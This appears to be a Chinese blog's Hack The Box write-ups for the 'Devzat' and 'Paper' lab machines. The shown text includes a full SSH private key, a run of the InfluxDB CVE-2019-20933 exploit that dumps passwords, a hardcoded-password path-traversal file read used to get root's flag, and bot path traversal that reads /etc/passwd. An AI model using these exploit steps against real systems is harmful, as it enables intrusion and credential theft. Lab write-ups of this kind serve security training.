Inappropriate ioctl for device bash: no job control in this shell patrick@devzat:~/pets$ whoami&amp;&amp;id whoami&amp;&amp;id patrick uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) 成功获得一个shell 使用python3获得一个交互式shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; User在当前用户patrick目录下存在ssh秘钥 cat /home/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- ┌──(root💀kali)-[~/Desktop] └─# chmod 700 id_rsa ┌──(root💀kali)-[~/Desktop] └─# ssh patrick@10.10.11.118 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 19 Feb 2022 09:20:45 AM UTC System load: 0.01 Processes: 243 Usage of /: 55.8% of 7.81GB Users logged in: 1 Memory usage: 23% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Feb 19 09:18:30 2022 from 10.10.16.23 成功登录ssh patrick@devzat:~$ whoami&amp;&amp;id patrick uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) 端口转发patrick@devzat:~$ ss -tunlp Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8086 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8443 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:5000 0.0.0.0:* users:((&quot;petshop&quot;,pid=908,fd=3)) tcp LISTEN 0 511 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:8000 *:* users:((&quot;devchat&quot;,pid=907,fd=7)) 这里我们把8086端口转发出去 ┌──(root💀kali)-[~/Desktop] └─# ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 19 Feb 2022 09:30:33 AM UTC System load: 0.0 Processes: 246 Usage of /: 55.8% of 7.81GB Users logged in: 1 Memory usage: 23% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Feb 19 09:20:46 2022 from 10.10.14.47 成功转发出来 Nmap┌──(root💀kali)-[~/Desktop] └─# nmap -p 8086 -sC -sV 127.0.0.1 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 04:33 EST Nmap scan report for localhost (127.0.0.1) Host is up (0.000048s latency). PORT STATE SERVICE VERSION 8086/tcp open http InfluxDB http admin 1.7.5 |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds Exploit这里发现是InfluxDB，去搜索一下是否有相关的漏洞 https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 使用该Exploit进行攻击 git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git cd InfluxDB-Exploit-CVE-2019-20933 pip install -r requirements.txt 下载安装所需要的环境 然后执行 ┌──(root💀kali)-[~/Desktop/InfluxDB-Exploit-CVE-2019-20933] └─# python3 __main__.py _____ __ _ _____ ____ ______ _ _ _ |_ _| / _| | | __ \\| _ \\ | ____| | | (_) | | | _ __ | |_| |_ ___ __ | | | |_) | | |__ __ ___ __ | | ___ _| |_ | | | &#39;_ \\| _| | | | \\ \\/ / | | | _ &lt; | __| \\ \\/ / &#39;_ \\| |/ _ \\| | __| _| |_| | | | | | | |_| |&gt; &lt;| |__| | |_) | | |____ &gt; &lt;| |_) | | (_) | | |_ |_____|_| |_|_| |_|\\__,_/_/\\_\\_____/|____/ |______/_/\\_\\ .__/|_|\\___/|_|\\__| | | |_| - using CVE-2019-20933 Host (default: localhost): Port (default: 8086): Username &lt;OR&gt; path to username file (default: users.txt): Bruteforcing usernames ... [v] admin Host vulnerable !!! Databases: 1) devzat 2) _internal .quit to exit [admin@127.0.0.1] Database: devzat Starting InfluxDB shell - .back to go back [admin@127.0.0.1/devzat] $ SELECT * FROM &quot;user&quot; { &quot;results&quot;: [ { &quot;series&quot;: [ { &quot;columns&quot;: [ &quot;time&quot;, &quot;enabled&quot;, &quot;password&quot;, &quot;username&quot; ], &quot;name&quot;: &quot;user&quot;, &quot;values&quot;: [ [ &quot;2021-06-22T20:04:16.313965493Z&quot;, false, &quot;WillyWonka2021&quot;, &quot;wilhelm&quot; ], [ &quot;2021-06-22T20:04:16.320782034Z&quot;, true, &quot;woBeeYareedahc7Oogeephies7Aiseci&quot;, &quot;catherine&quot; ], [ &quot;2021-06-22T20:04:16.996682002Z&quot;, true, &quot;RoyalQueenBee$&quot;, &quot;charles&quot; ] ] } ], &quot;statement_id&quot;: 0 } ] } Catherine在ssh中使用su切换到catherine用户 username = catherine password = woBeeYareedahc7Oogeephies7Aiseci catherine@devzat:~$ ls dev devzat-dev.zip devzat-main.zip main user.txt catherine@devzat:~$ cat user.txt a45f55a41f9cd103ea222c1e00466341 成功拿到user权限的flag文件 权限提升catherine@devzat:/var/backups$ ls apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz devzat-dev.zip devzat-main.zip 在&#x2F;var&#x2F;backups目录中有两个zip文件，我们copy出来解压出来看看 catherine@devzat:/tmp/lucifiel$ ls dev devzat-dev.zip devzat-main.zip main catherine@devzat:/tmp/lucifiel$ diff main/commands.go dev/commands.go 3a4 &gt; &quot;bufio&quot; 4a6,7 &gt; &quot;os&quot; &gt; &quot;path/filepath&quot; 36a40 &gt; file = commandInfo{&quot;file&quot;, &quot;Paste a files content directly to chat [alpha]&quot;, fileCommand, 1, false, nil} 38c42,101 &lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} --- &gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} &gt; } &gt; &gt; func fileCommand(u *user, args []string) { &gt; if len(args) &lt; 1 { &gt; u.system(&quot;Please provide file to print and the password&quot;) &gt; return &gt; } &gt; &gt; if len(args) &lt; 2 { &gt; u.system(&quot;You need to provide the correct password to use this function&quot;) &gt; return &gt; } &gt; &gt; path := args[0] &gt; pass := args[1] &gt; &gt; // Check my secure password &gt; if pass != &quot;CeilingCatStillAThingIn2021?&quot; { &gt; u.system(&quot;You did provide the wrong password&quot;) &gt; return &gt; } &gt; &gt; // Get CWD &gt; cwd, err := os.Getwd() &gt; if err != nil { &gt; u.system(err.Error()) &gt; } &gt; &gt; // Construct path to print &gt; printPath := filepath.Join(cwd, path) &gt; &gt; // Check if file exists &gt; if _, err := os.Stat(printPath); err == nil { &gt; // exists, print &gt; file, err := os.Open(printPath) &gt; if err != nil { &gt; u.system(fmt.Sprintf(&quot;Something went wrong opening the file: %+v&quot;, err.Error())) &gt; return &gt; } &gt; defer file.Close() &gt; &gt; scanner := bufio.NewScanner(file) &gt; for scanner.Scan() { &gt; u.system(scanner.Text()) &gt; } &gt; &gt; if err := scanner.Err(); err != nil { &gt; u.system(fmt.Sprintf(&quot;Something went wrong printing the file: %+v&quot;, err.Error())) &gt; } &gt; &gt; return &gt; &gt; } else if os.IsNotExist(err) { &gt; // does not exist, print error &gt; u.system(fmt.Sprintf(&quot;The requested file @ %+v does not exist!&quot;, printPath)) &gt; return &gt; } &gt; // bokred? &gt; u.system(&quot;Something went badly wrong.&quot;) 这里获得了一个密码CeilingCatStillAThingIn2021?，同时分析代码后知道了存在可控的文件读取功能，通过控制第一个参数控制路径，通过控制第二个参数pass绕过检测 ssh -l test localhost -p 8443 catherine@devzat:/tmp/lucifiel$ ssh -l test localhost -p 8443 13 minutes earlier devbot: catherine has joined the chat 12 minutes earlier catherine: all 1 minute earlier devbot: test has joined the chat test: file ../../../../root/root.txt CeilingCatStillAThingIn2021? catherine: close devbot: test has left the chat devbot: test stayed on for 1 minute catherine: exit Welcome to the chat. There is one more user devbot: test has joined the chat test: /file ../../../../root/root.txt CeilingCatStillAThingIn2021? [SYSTEM] c2b07bb41d02e2c880a4d1c9469d13ef 成功获得root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Paper - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Paper","date":"2022-02-19T11:38:36.000Z","updated":"2023-06-13T03:48:38.000Z","comments":true,"path":"2022/02/19/Hackthebox/Easy/Hackthebox-Paper/","link":"","permalink":"http://www.lucifiel.com/2022/02/19/Hackthebox/Easy/Hackthebox-Paper/","excerpt":"","text":"Hackthebox - Paper靶场信息 靶场类型 信息搜集nmap首先使用nmap进行信息搜集 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.143 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 22:29 EST Nmap scan report for 10.10.11.143 Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) |_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |_http-title: HTTP Server Test Page powered by CentOS | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US | Subject Alternative Name: DNS:localhost.localdomain | Not valid before: 2021-07-03T08:52:34 |_Not valid after: 2022-07-08T10:32:34 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36529%PV=Y%DS=2%DC=T%G=Y%TM=6210646 OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops TRACEROUTE (using port 53/tcp) HOP RTT ADDRESS 1 239.51 ms 10.10.14.1 2 239.64 ms 10.10.11.143 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.23 seconds Http 查看80端口的Http页面，发现是一个nginx的默认页面 暂时没什么可看的，去看看响应包吧 在响应包中看到了一个域名office.htb 去加入到hosts里 echo 10.10.11.143 office.paper 访问后可以看到是一个wordpress搭建的 使用wpscan扫描看看 Wpscan┌──(root💀kali)-[~/Desktop] └─# wpscan --url http://office.paper/ _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.17 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://office.paper/ [10.10.11.143] [+] Started: Fri Feb 18 22:59:11 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 | - X-Powered-By: PHP/7.2.24 | - X-Backend-Server: office.paper | Found By: Headers (Passive Detection) | Confidence: 100% [+] WordPress readme found: http://office.paper/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05). | Found By: Rss Generator (Passive Detection) | - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; | - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt; [+] WordPress theme in use: construction-techup | Location: http://office.paper/wp-content/themes/construction-techup/ | Last Updated: 2021-07-17T00:00:00.000Z | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt | [!] The version is out of date, the latest version is 1.4 | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1 | Style Name: Construction Techup | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a... | Author: wptexture | Author URI: https://testerwp.com/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:06 &lt;=====================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:06 [i] No Config Backups Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Fri Feb 18 22:59:23 2022 [+] Requests Done: 143 [+] Cached Requests: 31 [+] Data Sent: 35.766 KB [+] Data Received: 91.745 KB [+] Memory used: 230.363 MB [+] Elapsed time: 00:00:11 这里可以看到版本号是Wordpress 5.2.3 去Google一下是否有Exploit https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2 这里找到一个未经身份验证查看他人私人帖子的漏洞，去使用看看 http://office.paper/?static=1&amp;order=asc 直接使用会提示404，尝试把后面&amp;order&#x3D;asc删除试试 http://office.paper/?static=1 成功读取到一篇帖子，查看一下其中内容 test Micheal please remove the secret from drafts for gods sake! Hello employees of Blunder Tiffin, Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system. So, I kindly request you all to take your discussions from the public blog to a more private chat system. -Nick # Warning for Michael Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick Threat Level Midnight A MOTION PICTURE SCREENPLAY, WRITTEN AND DIRECTED BY MICHAEL SCOTT [INT:DAY] Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt…. # Secret Registration URL of new Employee chat system http://chat.office.paper/register/8qozr226AhkCHZdyY # I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick. # Also, stop looking at my drafts. Jeez! 其中提到了一个新员工聊天系统的秘密网址 http://chat.office.paper/register/8qozr226AhkCHZdyY 把新网址添加到hosts里 echo 10.10.11.143 chat.office.paper 这里可以注册一个新用户 我们去注册一个吧 注册后成功登录进来，去看看有什么内容没有 稍等一会然后看到了一个新的内容，去看看 这里提到有人在该频道中添加了一个新的机器人，只需要输入recyclops help机器人就会告诉你可以做什么 Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers. Most frequently asked questions include: - What time is it? - What new files are in your sales directory? - Why did the salesman crossed the road? - What&#39;s the content of file x in your sales directory? etc. Please note that I am a beta version and I still have some bugs to be fixed. How to use me ? : 1. Small Talk: You can ask me how dwight&#39;s weekend was, or did he watched the game last night etc. eg: &#39;recyclops how was your weekend?&#39; or &#39;recyclops did you watched the game last night?&#39; or &#39;recyclops what kind of bear is the best? 2. Joke: You can ask me Why the salesman crossed the road. eg: &#39;recyclops why did the salesman crossed the road?&#39; &lt;=====The following two features are for those boneheads, who still don&#39;t know how to use scp. I&#39;m Looking at you Kevin.=====&gt; For security reasons, the access is limited to the Sales folder. 3. Files: eg: &#39;recyclops get me the file test.txt&#39;, or &#39;recyclops could you send me the file src/test.php&#39; or just &#39;recyclops file test.txt&#39; 4. List: You can ask me to list the files 5. Time: You can ask me to what the time is eg: &#39;recyclops what time is it?&#39; or just &#39;recyclops time&#39; 然后机器人给出了自己的用法 漏洞利用目前可知的信息 我们有了一个可以互动的机器人 recyclops 机器人可以帮我们获得文件 我们无法在频道内发言 OK，到这里思路就很清晰了，我们去找机器人私聊 这里要求他读取test.txt文件 回复文件&#x2F;home&#x2F;dwight&#x2F;sales&#x2F;test.txt文件不存在，尝试一下是否可以路径穿越 这边构造了一下路径，成功获得&#x2F;etc&#x2F;passwd文件 root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin polkitd:x:998:996:User for polkitd:/:/sbin/nologin geoclue:x:997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin qemu:x:107:107:qemu user:/:/sbin/nologin apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin cockpit-ws:x:996:993:User for cockpit-ws:/:/sbin/nologin pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin unbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin gluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin chrony:x:993:987::/var/lib/chrony:/sbin/nologin libstoragemgmt:x:992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin dnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin radvd:x:75:75:radvd user:/:/sbin/nologin clevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin sssd:x:983:981:User for sssd:/:/sbin/nologin colord:x:982:980:User for colord:/var/lib/colord:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin setroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin pipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin gdm:x:42:42::/var/lib/gdm:/sbin/nologin gnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin insights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin mongod:x:976:974:mongod:/var/lib/mongo:/bin/false rocketchat:x:1001:1001::/home/rocketchat:/bin/bash dwight:x:1004:1004::/home/dwight:/bin/bash User我们查看一下当前文件 recyclops list total 0 drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 . drwx------ 11 dwight dwight 334 Feb 18 20:41 .. drwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2 没什么可看的，继续查看上级目录 recyclops list ../ total 788 drwx------ 11 dwight dwight 334 Feb 18 20:41 . drwxr-xr-x. 3 root root 20 Feb 18 23:14 .. lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc -rwxr-xr-x 1 dwight dwight 1174 Sep 16 06:58 bot_restart.sh drwx------ 5 dwight dwight 56 Jul 3 2021 .config -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth drwx------ 3 dwight dwight 69 Feb 18 22:58 .gnupg drwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot -rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history -rwxr-xr-x 1 dwight dwight 765818 Feb 18 20:37 linpeas.sh drwx------ 3 dwight dwight 19 Jul 3 2021 .local drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales drwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh -rw-rw-r-- 1 dwight dwight 2434 Feb 18 20:41 testfile.py -r-------- 1 dwight dwight 33 Feb 18 19:01 user.txt drwxr-xr-x 2 dwight dwight 24 Sep 16 07:09 .vim -rw------- 1 dwight dwight 818 Feb 18 20:41 .viminfo 在这个目录中，有一个hubot文件我很好奇，进去看看 recyclops list ../hubot total 1908 drwx------ 8 dwight dwight 4096 Sep 16 07:57 . drwx------ 11 dwight dwight 334 Feb 18 20:41 .. -rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \\ srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000 srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080 drwx--x--x 2 dwight dwight 36 Sep 16 07:34 bin -rw-r--r-- 1 dwight dwight 258 Sep 16 07:57 .env -rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json drwx------ 8 dwight dwight 163 Jul 3 2021 .git -rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore -rw-r--r-- 1 dwight dwight 1803113 Feb 18 23:41 .hubot.log -rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE 